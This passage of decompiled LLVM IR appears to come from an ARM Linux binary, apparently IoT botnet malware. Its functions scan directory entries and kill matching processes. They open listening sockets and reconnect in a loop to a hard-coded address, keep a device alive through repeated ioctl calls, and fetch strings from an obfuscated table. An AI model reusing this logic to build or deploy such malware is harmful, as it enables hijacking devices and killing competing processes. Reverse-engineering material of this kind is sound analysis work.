  %tmp = icmp ugt i32 %v1_f908, 9
  br i1 %tmp, label %dec_label_pc_f8f4.backedge, label %dec_label_pc_f914

dec_label_pc_f914:                                ; preds = %dec_label_pc_f904
  store i32 %v1_f904, i32* @r4, align 4
  %v3_f920 = call i32 @function_12e60(i8* %v2_f904, i32 10)
  %v0_f924 = load i32, i32* @r6, align 4
  store i32 %v3_f920, i32* @r7, align 4
  %v0_f92c = load i32, i32* %sb.global-to-local, align 4
  %v1_f92c = add i32 %v0_f92c, 1
  store i32 %v1_f92c, i32* %sb.global-to-local, align 4
  %v5_f930 = icmp slt i32 %v0_f924, %v3_f920
  %v2_f990 = call i32 @time(i32* null)
  br i1 %v5_f930, label %dec_label_pc_f98c, label %dec_label_pc_f934

dec_label_pc_f934:                                ; preds = %dec_label_pc_f914
  %v0_f93c = load i32, i32* @r5, align 4
  %v2_f93c = sub i32 %v2_f990, %v0_f93c
  %v7_f944 = icmp slt i32 %v2_f93c, 601
  br i1 %v7_f944, label %dec_label_pc_f94c, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_f934
  store i32 400, i32* @r6, align 4
  br label %dec_label_pc_f8f4.backedge

dec_label_pc_f94c:                                ; preds = %dec_label_pc_f934
  %v0_f94c = load i32, i32* @r7, align 4
  %v7_f950 = icmp slt i32 %v0_f94c, 401
  br i1 %v7_f950, label %dec_label_pc_f8f4.backedge, label %dec_label_pc_f954

dec_label_pc_f954:                                ; preds = %dec_label_pc_f94c
  %v0_f954 = load i32, i32* %sb.global-to-local, align 4
  %v2_f95c = urem i32 %v0_f954, 10
  %v2_f960 = icmp eq i32 %v2_f95c, 0
  br i1 %v2_f960, label %dec_label_pc_f968, label %dec_label_pc_f8f4.backedge

dec_label_pc_f968:                                ; preds = %dec_label_pc_f954
  %v1_f96c = call i32 @sleep(i32 1)
  %v0_f970 = load i32, i32* @sl, align 4
  %v1_f970 = inttoptr i32 %v0_f970 to %__dirstream*
  %v3_f974 = call %dirent* @readdir(%__dirstream* %v1_f970)
  %v2_f978 = icmp eq %dirent* %v3_f974, null
  br i1 %v2_f978, label %dec_label_pc_f980, label %dec_label_pc_f904

dec_label_pc_f980:                                ; preds = %dec_label_pc_f8f4.backedge, %dec_label_pc_f968, %dec_label_pc_f8ec
  %v0_f980 = load i32, i32* @sl, align 4
  %v1_f980 = inttoptr i32 %v0_f980 to %__dirstream*
  %v3_f984 = call i32 @closedir(%__dirstream* %v1_f980)
  br label %dec_label_pc_f8cc

dec_label_pc_f98c:                                ; preds = %dec_label_pc_f914
  store i32 %v2_f990, i32* %stack_var_-632, align 4
  %v1_f99c = call i32 @function_12280(i32 6)
  %v1_f9a4 = call i32 @function_12280(i32 10)
  %v3_f9b0 = call i32 @function_1219c(i32 6, i32* null)
  store i32 %v2_f8c4, i32* @r0, align 4
  %v3_f9bc = call i32 @function_12d5c(i8* %v2_f9bc, i32 %v3_f9b0)
  %v0_f9c0 = load i32, i32* %fp.global-to-local, align 4
  %v2_f9c0 = add i32 %v0_f9c0, %v3_f9bc
  store i32 %v2_f9c0, i32* @r5, align 4
  %v0_f9c4 = load i32, i32* @r4, align 4
  store i32 %v2_f9c0, i32* @r0, align 4
  %v2_f9cc = inttoptr i32 %v2_f9c0 to i8*
  %v3_f9cc = call i32 @function_12d5c(i8* %v2_f9cc, i32 %v0_f9c4)
  store i32 %v3_f9cc, i32* @r4, align 4
  %v3_f9dc = call i32 @function_1219c(i32 10, i32* null)
  %v0_f9e4 = load i32, i32* @r5, align 4
  %v1_f9e4 = load i32, i32* @r4, align 4
  %v2_f9e4 = add i32 %v1_f9e4, %v0_f9e4
  store i32 %v2_f9e4, i32* @r0, align 4
  %v2_f9e8 = inttoptr i32 %v2_f9e4 to i8*
  %v3_f9e8 = call i32 @function_12d5c(i8* %v2_f9e8, i32 %v3_f9dc)
  %v1_f9f0 = call i32 @function_121c8(i32 6)
  %v1_f9f8 = call i32 @function_121c8(i32 10)
  %v4_fa04 = call i32 (i8*, i32, ...) @open(i8* %v2_f9bc, i32 0)
  %v7_fa08 = icmp eq i32 %v4_fa04, -1
  store i32 %v4_fa04, i32* @r6, align 4
  br i1 %v7_fa08, label %dec_label_pc_fab0, label %dec_label_pc_fa14

dec_label_pc_fa14:                                ; preds = %dec_label_pc_f98c
  %v1_fa18 = call i32 @function_12280(i32 62)
  br label %dec_label_pc_fa1c

dec_label_pc_fa1c:                                ; preds = %dec_label_pc_fa84, %.thread6, %dec_label_pc_fa34, %dec_label_pc_fa14
  %v0_fa1c = load i32, i32* @r6, align 4
  %v4_fa28 = call i32 @read(i32 %v0_fa1c, i32* nonnull %stack_var_-628, i32 512)
  store i32 %v4_fa28, i32* @r4, align 4
  %tmp61 = icmp slt i32 %v4_fa28, 1
  br i1 %tmp61, label %dec_label_pc_fad0, label %dec_label_pc_fa34

dec_label_pc_fa34:                                ; preds = %dec_label_pc_fa1c
  %v3_fa3c = call i32 @function_1219c(i32 62, i32* null)
  store i32 %v3_fa3c, i32* @r5, align 4
  %v3_fa4c = call i32 @function_1219c(i32 62, i32* null)
  %v1_fa50 = inttoptr i32 %v3_fa4c to i8*
  %v2_fa50 = call i32 @function_12d34(i8* %v1_fa50)
  %v0_fa54 = load i32, i32* @r4, align 4
  %v5_fa58 = icmp slt i32 %v0_fa54, %v2_fa50
  br i1 %v5_fa58, label %dec_label_pc_fa1c, label %.thread6

.thread6:                                         ; preds = %dec_label_pc_fa34
  %v1_fa6412 = add i32 %v0_fa54, -1
  store i32 %v1_fa6412, i32* @r4, align 4
  %v2_fa6413 = icmp eq i32 %v0_fa54, 0
  br i1 %v2_fa6413, label %dec_label_pc_fa1c, label %dec_label_pc_fa6c.lr.ph

dec_label_pc_fa6c.lr.ph:                          ; preds = %.thread6
  %v0_fa6c.pre = load i32, i32* @r5, align 4
  %v1_fa70.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_fa6c

dec_label_pc_fa6c:                                ; preds = %dec_label_pc_fa84, %dec_label_pc_fa6c.lr.ph
  %v0_fa64 = phi i32 [ %v1_fa6412, %dec_label_pc_fa6c.lr.ph ], [ %v1_fa64, %dec_label_pc_fa84 ]
  %v0_fa84 = phi i32 [ 0, %dec_label_pc_fa6c.lr.ph ], [ %v1_fa84, %dec_label_pc_fa84 ]
  %v0_fa78 = phi i32 [ 0, %dec_label_pc_fa6c.lr.ph ], [ %v1_fa78., %dec_label_pc_fa84 ]
  %v2_fa6c = add i32 %v0_fa78, %v0_fa6c.pre
  %v3_fa6c = inttoptr i32 %v2_fa6c to i8*
  %v4_fa6c = load i8, i8* %v3_fa6c, align 1
  %v2_fa70 = add i32 %v0_fa84, %v1_fa70.pre
  %v3_fa70 = inttoptr i32 %v2_fa70 to i8*
  %v4_fa70 = load i8, i8* %v3_fa70, align 1
  %v9_fa74 = icmp eq i8 %v4_fa70, %v4_fa6c
  %v1_fa78 = add i32 %v0_fa78, 1
  %v1_fa78. = select i1 %v9_fa74, i32 %v1_fa78, i32 0
  br i1 %v9_fa74, label %dec_label_pc_fa8c, label %dec_label_pc_fa84

dec_label_pc_fa84:                                ; preds = %dec_label_pc_fa8c, %dec_label_pc_fa6c
  %v1_fa84 = add i32 %v0_fa84, 1
  %v1_fa64 = add i32 %v0_fa64, -1
  store i32 %v1_fa64, i32* @r4, align 4
  %v2_fa64 = icmp eq i32 %v0_fa64, 0
  br i1 %v2_fa64, label %dec_label_pc_fa1c, label %dec_label_pc_fa6c

dec_label_pc_fa8c:                                ; preds = %dec_label_pc_fa6c
  %v9_fa8c = icmp eq i32 %v2_fa50, %v1_fa78.
  br i1 %v9_fa8c, label %dec_label_pc_fa94, label %dec_label_pc_fa84

dec_label_pc_fa94:                                ; preds = %dec_label_pc_fa8c
  %v1_fa98 = call i32 @function_121c8(i32 62)
  %v0_fa9c = load i32, i32* @r6, align 4
  %v1_faa0 = call i32 @close(i32 %v0_fa9c)
  %v0_faa4 = load i32, i32* @r7, align 4
  %v2_faac = call i32 @kill(i32 %v0_faa4, i32 9)
  br label %dec_label_pc_fab0

dec_label_pc_fab0:                                ; preds = %dec_label_pc_f98c, %dec_label_pc_fad0, %dec_label_pc_fa94
  %v2_fab8 = call i32 @function_12dd4(i32 %v2_f8c4, i32 64)
  %v1_fac0 = call i32 @sleep(i32 1)
  %v2_fac4 = load i32, i32* %stack_var_-632, align 4
  store i32 %v2_fac4, i32* @r5, align 4
  %v0_fac8 = load i32, i32* @r7, align 4
  store i32 %v0_fac8, i32* @r6, align 4
  br label %dec_label_pc_f8f4.backedge

dec_label_pc_f8f4.backedge:                       ; preds = %dec_label_pc_f954, %dec_label_pc_f94c, %dec_label_pc_f904, %dec_label_pc_fab0, %.thread1
  %v0_f8f4 = load i32, i32* @sl, align 4
  %v1_f8f4 = inttoptr i32 %v0_f8f4 to %__dirstream*
  %v3_f8f8 = call %dirent* @readdir(%__dirstream* %v1_f8f4)
  %v2_f8fc = icmp eq %dirent* %v3_f8f8, null
  br i1 %v2_f8fc, label %dec_label_pc_f980, label %dec_label_pc_f904.preheader

dec_label_pc_fad0:                                ; preds = %dec_label_pc_fa1c
  %v1_fad4 = call i32 @function_121c8(i32 62)
  %v0_fad8 = load i32, i32* @r6, align 4
  %v1_fadc = call i32 @close(i32 %v0_fad8)
  br label %dec_label_pc_fab0

dec_label_pc_fae4:                                ; preds = %dec_label_pc_f870
  %v0_fae4 = load i32, i32* @r4, align 4
  %v0_faec = load i32, i32* @r5, align 4
  %v3_fafc = call i32 @socket(i32 %v0_faec, i32 1, i32 %v0_fae4)
  %v7_fb00 = icmp eq i32 %v3_fafc, -1
  store i32 %v3_fafc, i32* @r4, align 4
  br i1 %v7_fb00, label %dec_label_pc_f890, label %dec_label_pc_fb0c

dec_label_pc_fb0c:                                ; preds = %dec_label_pc_fae4
  %v2_fb0c = ptrtoint i32* %stack_var_-52 to i32
  %v6_fb14 = call i32 @bind(i32 %v2_fb0c, %sockaddr* inttoptr (i32 16 to %sockaddr*), i32 16)
  %v0_fb18 = load i32, i32* @r4, align 4
  %v2_fb20 = call i32 @listen(i32 %v0_fb18, i32 1)
  br label %dec_label_pc_f890

; uselistorder directives
  uselistorder i32 %v3_fafc, { 1, 0 }
  uselistorder %dirent* %v3_f8f8, { 1, 0 }
  uselistorder i32 %v1_fa64, { 1, 0 }
  uselistorder i32 %v1_fa78., { 1, 0 }
  uselistorder i1 %v9_fa74, { 1, 0 }
  uselistorder i32 %v0_fa78, { 1, 0 }
  uselistorder i32 %v0_fa84, { 1, 0 }
  uselistorder i32 %v0_fa64, { 1, 0 }
  uselistorder i32 %v0_fa54, { 1, 0, 2 }
  uselistorder i32 %v2_fa50, { 1, 0 }
  uselistorder i32 %v4_fa04, { 1, 0 }
  uselistorder %dirent* %v3_f974, { 1, 0 }
  uselistorder i32 %v5_f8e0, { 1, 0 }
  uselistorder i32 %storemerge38, { 1, 0 }
  uselistorder i32 %v0_f83c, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32 64, { 4, 10, 11, 0, 5, 12, 13, 14, 6, 15, 16, 17, 18, 7, 19, 20, 21, 8, 22, 23, 24, 9, 25, 26, 27, 1, 28, 29, 30, 31, 32, 2, 33, 34, 35, 36, 37, 3, 38, 39 }
  uselistorder i32 512, { 7, 8, 1, 2, 10, 9, 3, 11, 4, 12, 5, 13, 0, 6, 14 }
  uselistorder i32 (%__dirstream*)* @closedir, { 2, 1, 0, 3 }
  uselistorder i32 (i8*, i32)* @function_12e60, { 1, 2, 0, 3, 4, 5 }
  uselistorder %dirent* null, { 4, 3, 1, 5, 6, 7, 0, 8, 2 }
  uselistorder %dirent* (%__dirstream*)* @readdir, { 5, 8, 1, 7, 6, 3, 0, 4, 2, 9 }
  uselistorder %__dirstream* (i8*)* @opendir, { 1, 0, 2, 3 }
  uselistorder i32 4096, { 3, 4, 0, 5, 1, 2 }
  uselistorder label %dec_label_pc_f8f4.backedge, { 3, 0, 1, 4, 2 }
  uselistorder label %dec_label_pc_fab0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f904, { 1, 0 }
  uselistorder label %dec_label_pc_f904.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f890, { 2, 1, 0 }
}

define i32 @function_fb34(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_fb34:
  store i32 ptrtoint (i32* @global_var_fb4c.154 to i32), i32* @global_var_1c194.156, align 4
  ret i32 %arg1
}

define i32 @function_fb4c() local_unnamed_addr {
dec_label_pc_fb4c:
  %stack_var_-8 = alloca i32, align 4
  %v3_fb4c = load i32, i32* @r4, align 4
  store i32 %v3_fb4c, i32* %stack_var_-8, align 4
  %v1_fb54 = call i32 @function_12280(i32 2)
  store i32 1503156639, i32* @global_var_1c228.160, align 4
  %v3_fb6c = call i32 @function_1219c(i32 2, i32* null)
  %v4_fb6c = inttoptr i32 %v3_fb6c to i8*
  %v2_fb70 = add i32 %v3_fb6c, 1
  %v3_fb70 = inttoptr i32 %v2_fb70 to i8*
  %v4_fb70 = load i8, i8* %v3_fb70, align 1
  %v3_fb74 = load i8, i8* %v4_fb6c, align 1
  store i8 %v4_fb70, i8* bitcast (i32* @global_var_1c227.161 to i8*), align 4
  store i8 %v3_fb74, i8* bitcast (i32* @global_var_1c226.162 to i8*), align 4
  %v2_fb8c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fb8c, i32* @r4, align 4
  %v1_fb90 = call i32 @function_121c8(i32 2)
  %v0_fb94 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_fb94, label %bb, label %bb4

bb:                                               ; preds = %dec_label_pc_fb4c
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_fb4c, %bb
  %v0_fb98 = load i1, i1* @cpsr_n, align 1
  br i1 %v0_fb98, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  %v1_fb98 = load i32, i32* @r8, align 4
  %v2_fb98 = add i32 %v1_fb98, 4
  %v3_fb98 = inttoptr i32 %v2_fb98 to i32*
  %v4_fb98 = load i32, i32* %v3_fb98, align 4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v32_fb98 = phi i32 [ %v1_fb90, %bb4 ], [ %v4_fb98, %bb5 ]
  ret i32 %v32_fb98

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_fb9c(i32 %arg1) local_unnamed_addr {
dec_label_pc_fb9c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_fb9c = load i32, i32* @r4, align 4
  %v9_fb9c = load i32, i32* @r6, align 4
  %v12_fb9c = load i32, i32* @r7, align 4
  %v15_fb9c = load i32, i32* @r8, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_fbb8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_1c18c.164 to i32), i32* @r6, align 4
  %v7_fbc0 = icmp eq i32 %v3_fbb8, -1
  store i32 %v3_fbb8, i32* @global_var_1c18c.164, align 4
  br i1 %v7_fbc0, label %dec_label_pc_fc80, label %dec_label_pc_fbcc

dec_label_pc_fbcc:                                ; preds = %dec_label_pc_fb9c
  %v0_fbd0 = load i32, i32* %r4.global-to-local, align 4
  %v6_fbe0 = call i32 @setsockopt(i32 %v3_fbb8, i32 %v0_fbd0, i32 2, i32* nonnull %stack_var_-28, i32 4)
  %v2_fbe4 = load i32, i32* @global_var_1c18c.164, align 4
  store i32 %v2_fbe4, i32* %r4.global-to-local, align 4
  %v2_fbf4 = call i32 (i32, i32, ...) @fcntl(i32 %v2_fbe4, i32 3)
  %v2_fc04 = call i32 (i32, i32, ...) @fcntl(i32 %v2_fbe4, i32 4)
  store i32 ptrtoint (i8** @global_var_1c198.166 to i32), i32* @r8, align 4
  %v2_fc0c = load i8, i8* bitcast (i8** @global_var_1c198.166 to i8*), align 4
  %v2_fc10 = icmp eq i8 %v2_fc0c, 0
  br i1 %v2_fc10, label %.thread2, label %.thread

.thread2:                                         ; preds = %dec_label_pc_fbcc
  br label %bb

.thread:                                          ; preds = %dec_label_pc_fbcc
  br label %bb

bb:                                               ; preds = %.thread2, %.thread
  store i32 0, i32* @r5, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_fc48 = call i32* @__errno_location()
  %v2_fc48 = ptrtoint i32* %v0_fc48 to i32
  %v0_fc4c = load i32, i32* @r5, align 4
  store i32 %v0_fc4c, i32* %v0_fc48, align 4
  %v2_fc50 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_fc50, i32* @r7, align 4
  store i32 %v2_fc48, i32* %r4.global-to-local, align 4
  %tmp21 = bitcast i32* %stack_var_-44 to %sockaddr*
  %v2_fc5c = load i32, i32* @global_var_1c18c.164, align 4
  %v5_fc64 = call i32 @bind(i32 %v2_fc5c, %sockaddr* %tmp21, i32 16)
  %v7_fc68 = icmp eq i32 %v5_fc64, -1
  br i1 %v7_fc68, label %dec_label_pc_fc88, label %dec_label_pc_fc70

dec_label_pc_fc70:                                ; preds = %bb
  %v2_fc78 = load i32, i32* @global_var_1c18c.164, align 4
  %v2_fc7c = call i32 @listen(i32 %v2_fc78, i32 1)
  br label %dec_label_pc_fc80

dec_label_pc_fc80:                                ; preds = %dec_label_pc_fb9c, %dec_label_pc_fc94, %dec_label_pc_fc70
  %v20_fc84 = phi i32 [ %v3_fbb8, %dec_label_pc_fb9c ], [ %v1_fce4, %dec_label_pc_fc94 ], [ %v2_fc7c, %dec_label_pc_fc70 ]
  store i32 %v3_fb9c, i32* @r4, align 4
  store i32 %v9_fb9c, i32* @r6, align 4
  store i32 %v12_fb9c, i32* @r7, align 4
  store i32 %v15_fb9c, i32* @r8, align 4
  ret i32 %v20_fc84

dec_label_pc_fc88:                                ; preds = %bb
  %v0_fc88 = load i32, i32* %r4.global-to-local, align 4
  %v1_fc88 = inttoptr i32 %v0_fc88 to i32*
  %v2_fc88 = load i32, i32* %v1_fc88, align 4
  %v7_fc8c = icmp eq i32 %v2_fc88, 99
  br i1 %v7_fc8c, label %dec_label_pc_fcec, label %dec_label_pc_fc94

dec_label_pc_fc94:                                ; preds = %dec_label_pc_fcec, %bb22, %dec_label_pc_fc88
  store i32 0, i32* @r4, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v2_fcac = load i32, i32* @global_var_1c18c.164, align 4
  %v5_fcc4 = call i32 @connect(i32 %v2_fcac, %sockaddr* %tmp21, i32 16)
  %v1_fccc = call i32 @sleep(i32 5)
  %v2_fcd0 = load i32, i32* @global_var_1c18c.164, align 4
  %v1_fcd4 = call i32 @close(i32 %v2_fcd0)
  %v1_fce0 = call i32 @function_f2a8(i32 50951)
  %v1_fce4 = call i32 @function_fb9c(i32 %v1_fce0)
  br label %dec_label_pc_fc80

dec_label_pc_fcec:                                ; preds = %dec_label_pc_fc88
  %v2_fcec = load i8, i8* bitcast (i8** @global_var_1c198.166 to i8*), align 4
  %v3_fcec = zext i8 %v2_fcec to i32
  %v1_fcf0 = load i32, i32* @r5, align 4
  %v9_fcf0 = icmp eq i32 %v3_fcec, %v1_fcf0
  br i1 %v9_fcf0, label %dec_label_pc_fc94, label %bb22

bb22:                                             ; preds = %dec_label_pc_fcec
  %v2_fcf8 = trunc i32 %v1_fcf0 to i8
  store i8 %v2_fcf8, i8* bitcast (i8** @global_var_1c198.166 to i8*), align 4
  br label %dec_label_pc_fc94

; uselistorder directives
  uselistorder i32 %v3_fbb8, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 3, 2 }
  uselistorder i32 (i32)* @function_f2a8, { 1, 0 }
  uselistorder i32 (i32, %sockaddr*, i32)* @bind, { 2, 1, 0, 3 }
  uselistorder i8* bitcast (i8** @global_var_1c198.166 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_1c198.166, { 1, 0 }
  uselistorder label %dec_label_pc_fc94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fc80, { 1, 2, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_fd0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_fd0c:
  %v3_fd0c = load i32, i32* @r4, align 4
  %v6_fd0c = load i32, i32* @r5, align 4
  %v0_fd14 = call i32 @fork()
  %v7_fd18 = icmp eq i32 %v0_fd14, -1
  %. = zext i1 %v7_fd18 to i32
  %tmp11 = icmp slt i32 %v0_fd14, 1
  %storemerge5 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge5, i32* @r5, align 4
  %v2_fd34 = icmp eq i32 %storemerge5, 0
  store i32 %v0_fd14, i32* @global_var_1c1cc.169, align 4
  br i1 %v2_fd34, label %dec_label_pc_fd48, label %dec_label_pc_fd40

dec_label_pc_fd40:                                ; preds = %dec_label_pc_fd0c
  store i32 %v3_fd0c, i32* @r4, align 4
  store i32 %v6_fd0c, i32* @r5, align 4
  ret i32 %v0_fd14

dec_label_pc_fd48:                                ; preds = %dec_label_pc_fd0c
  %v1_fd54 = call i32 @function_12280(i32 59)
  %v1_fd5c = call i32 @function_12280(i32 60)
  %v0_fd60 = load i32, i32* @r5, align 4
  %v2_fd68 = inttoptr i32 %v0_fd60 to i32*
  %v3_fd68 = call i32 @function_1219c(i32 59, i32* %v2_fd68)
  %v4_fd68 = inttoptr i32 %v3_fd68 to i8*
  %v4_fd70 = call i32 (i8*, i32, ...) @open(i8* %v4_fd68, i32 2)
  %v7_fd74 = icmp eq i32 %v4_fd70, -1
  store i32 %v4_fd70, i32* @r4, align 4
  br i1 %v7_fd74, label %dec_label_pc_fdbc, label %dec_label_pc_fd80

dec_label_pc_fd80:                                ; preds = %dec_label_pc_fdbc, %dec_label_pc_fd48
  %v0_fd8c = phi i32 [ %v4_fdcc, %dec_label_pc_fdbc ], [ %v4_fd70, %dec_label_pc_fd48 ]
  %v2_fd94 = call i32 (i32, i32, ...) @ioctl(i32 %v0_fd8c, i32 -2147199228)
  br label %dec_label_pc_fd98

dec_label_pc_fd98:                                ; preds = %dec_label_pc_fd98, %dec_label_pc_fd80
  %v0_fda4 = load i32, i32* @r4, align 4
  %v2_fdac = call i32 (i32, i32, ...) @ioctl(i32 %v0_fda4, i32 -2147199227)
  %v1_fdb4 = call i32 @sleep(i32 10)
  br label %dec_label_pc_fd98

dec_label_pc_fdbc:                                ; preds = %dec_label_pc_fd48
  %v0_fdbc = load i32, i32* @r5, align 4
  %v2_fdc4 = inttoptr i32 %v0_fdbc to i32*
  %v3_fdc4 = call i32 @function_1219c(i32 60, i32* %v2_fdc4)
  %v4_fdc4 = inttoptr i32 %v3_fdc4 to i8*
  %v4_fdcc = call i32 (i8*, i32, ...) @open(i8* %v4_fdc4, i32 2)
  %v3_fdd0 = icmp eq i32 %v4_fdcc, -1
  store i32 %v4_fdcc, i32* @r4, align 4
  br i1 %v3_fdd0, label %dec_label_pc_fddc, label %dec_label_pc_fd80

dec_label_pc_fddc:                                ; preds = %dec_label_pc_fdbc
  %v1_fde0 = call i32 @function_121c8(i32 59)
  %v1_fde8 = call i32 @function_121c8(i32 60)
  %v0_fdec = load i32, i32* @r5, align 4
  call void @exit(i32 %v0_fdec)
  unreachable

; uselistorder directives
  uselistorder i32 %v4_fdcc, { 1, 2, 0 }
  uselistorder i32 %v4_fd70, { 1, 2, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v0_fd14, { 3, 1, 2, 0 }
  uselistorder i32 (i32, i32, ...)* @ioctl, { 1, 0, 2 }
  uselistorder i32 (i8*, i32, ...)* @open, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32 60, { 1, 2, 3, 0, 4 }
  uselistorder i32 59, { 0, 1, 2, 4, 3 }
}

define i32 @function_fdf8(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_fdf8:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-1548 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-38 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-524 = alloca i32, align 4
  %stack_var_-396 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_fdf8 = load i32, i32* @r4, align 4
  store i32 %v3_fdf8, i32* %stack_var_-36, align 4
  %v6_fdf8 = load i32, i32* @r5, align 4
  %v9_fdf8 = load i32, i32* @r6, align 4
  %v15_fdf8 = load i32, i32* @r8, align 4
  %v2_fe04 = ptrtoint i32* %stack_var_-268 to i32
  store i32 %v2_fe04, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %tmp43 = bitcast i32* %stack_var_-268 to %_TYPEDEF_sigset_t*
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v3_fe1c = call i32 @sigemptyset(%_TYPEDEF_sigset_t* %tmp43)
  %v4_fe28 = call i32 @sigaddset(%_TYPEDEF_sigset_t* %tmp43, i32 2)
  %v0_fe2c = load i32, i32* @r5, align 4
  %v1_fe2c = inttoptr i32 %v0_fe2c to %_TYPEDEF_sigset_t*
  store i32 %v0_fe2c, i32* %r2.global-to-local, align 4
  %v7_fe38 = call i32 @sigprocmask(i32 %v0_fe2c, %_TYPEDEF_sigset_t* %tmp43, %_TYPEDEF_sigset_t* %v1_fe2c)
  %v4_fe44 = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i32 1 to void (i32)*))
  %v4_fe50 = call void (i32)* @signal(i32 5, void (i32)* bitcast (void (i32)** @global_var_fb34.171 to void (i32)*))
  %v0_fe54 = call i32 @function_12fec()
  store i32 %v0_fe54, i32* @global_var_1c21c.135, align 4
  store i32 1494907824, i32* %r2.global-to-local, align 4
  store i8 23, i8* bitcast (i32* @global_var_1c227.161 to i8*), align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i8 2, i8* bitcast (%sockaddr** @global_var_1c224.158 to i8*), align 4
  store i32 1494907824, i32* @global_var_1c228.160, align 4
  %v0_fe7c = load i32, i32* @r5, align 4
  %v1_fe7c = trunc i32 %v0_fe7c to i8
  store i8 %v1_fe7c, i8* bitcast (i32* @global_var_1c226.162 to i8*), align 4
  store i8 %v1_fe7c, i8* bitcast (i32* @global_var_1c225.175 to i8*), align 4
  %v6_fe84 = call i32 @function_12338(i32 %v0_fe54, i32 ptrtoint (%sockaddr** @global_var_1c224.158 to i32), i32 1494907824, i32 2)
  store i32 ptrtoint (i32* @global_var_fb4c.154 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_fb4c.154 to i32), i32* @global_var_1c194.156, align 4
  %v2_fe98 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_fe98, i32* @sb, align 4
  %v1_fe9c = call i32 @function_fb9c(i32 %v6_fe84)
  %v1_fea0 = call i32 @function_10608(i32 %v1_fe9c)
  %v2_feac = call i32 @function_12dd4(i32 %v2_fe98, i32 32)
  %v0_feb0 = load i32, i32* @r6, align 4
  %v7_feb0 = icmp eq i32 %v0_feb0, 2
  br i1 %v7_feb0, label %dec_label_pc_ffdc, label %dec_label_pc_feb8

dec_label_pc_feb8:                                ; preds = %dec_label_pc_ffdc, %dec_label_pc_fdf8, %dec_label_pc_ffec
  %v0_feb8 = call i32 @function_105b0()
  store i32 %v0_feb8, i32* %r6.global-to-local, align 4
  %v0_fec0 = load i32, i32* @r8, align 4
  %v1_fec0 = inttoptr i32 %v0_fec0 to i32*
  %v2_fec0 = load i32, i32* %v1_fec0, align 4
  %v1_fec4 = inttoptr i32 %v2_fec0 to i8*
  %v2_fec4 = call i32 @function_12d34(i8* %v1_fec4)
  store i32 %v2_fec4, i32* %r4.global-to-local, align 4
  %v0_fecc = load i32, i32* @r8, align 4
  %v1_fecc = inttoptr i32 %v0_fecc to i32*
  %v2_fecc = load i32, i32* %v1_fecc, align 4
  %v1_fed0 = inttoptr i32 %v2_fecc to i8*
  %v2_fed0 = call i32 @function_12d34(i8* %v1_fed0)
  %v1_fed4 = sub i32 20, %v2_fec4
  store i32 %v2_fed0, i32* @r5, align 4
  %v0_fedc = load i32, i32* %r6.global-to-local, align 4
  %v2_fee0 = urem i32 %v0_fedc, %v1_fed4
  %v2_fee8 = add i32 %v2_fee0, %v2_fed0
  store i32 %v2_fee8, i32* @r4, align 4
  %v2_feec = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_feec, i32* @r6, align 4
  %v2_fef8 = call i32 @function_10664(i32 %v2_feec, i32 %v2_fee8)
  %v2_fefc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_fefc, i32* %r2.global-to-local, align 4
  %v1_ff00 = load i32, i32* @r4, align 4
  %v2_ff00 = add i32 %v1_ff00, %v2_fefc
  store i32 %v2_ff00, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_ff0c = load i32, i32* @r8, align 4
  %v1_ff0c = inttoptr i32 %v0_ff0c to i32*
  %v2_ff0c = load i32, i32* %v1_ff0c, align 4
  store i32 %v2_ff0c, i32* @r0, align 4
  %v3_ff10 = add i32 %v2_ff00, -72
  %v4_ff10 = inttoptr i32 %v3_ff10 to i8*
